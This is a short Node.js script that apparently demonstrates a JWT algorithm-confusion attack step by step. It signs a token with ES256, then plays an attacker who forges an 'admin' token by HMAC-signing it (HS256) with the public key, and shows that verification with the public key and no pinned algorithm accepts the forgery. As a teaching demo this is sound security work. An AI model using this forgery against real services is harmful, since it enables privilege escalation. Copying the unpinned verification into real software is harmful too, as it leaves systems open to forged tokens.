import { randomUUID } from 'node:crypto'
import fs from 'node:fs/promises'
import { createInterface } from 'node:readline/promises'
import jwt from 'jsonwebtoken'

const pauseInterface = createInterface(process.stdin)

// ==== Authorization Server issues token ======================================
// =============================================================================
const privateKey = await fs.readFile('private-key.pem')
const publicKey = await fs.readFile('public-key.pem')

const authToken = jwt.sign({ sub: randomUUID(), role: 'member' }, privateKey, {
  algorithm: 'ES256'
})
console.log('token sent', { authToken })
await pauseInterface.question('')

// ==== Token accessible to malicious party ====================================
// =============================================================================
// Only should have access to the token and the public key
const payload = jwt.verify(authToken, publicKey)
console.log('Attacker has payload', { payload })
const newToken = jwt.sign(
  { sub: payload.sub, role: 'admin', hacked: true },
  publicKey,
  { algorithm: 'HS256' }
)
console.log('new token', { newToken })
await pauseInterface.question('')

// ==== Token sent to API ======================================================
// =============================================================================
const verifiedPayload = jwt.verify(newToken, publicKey)
console.log('Validated token', { verifiedPayload })

pauseInterface.close()
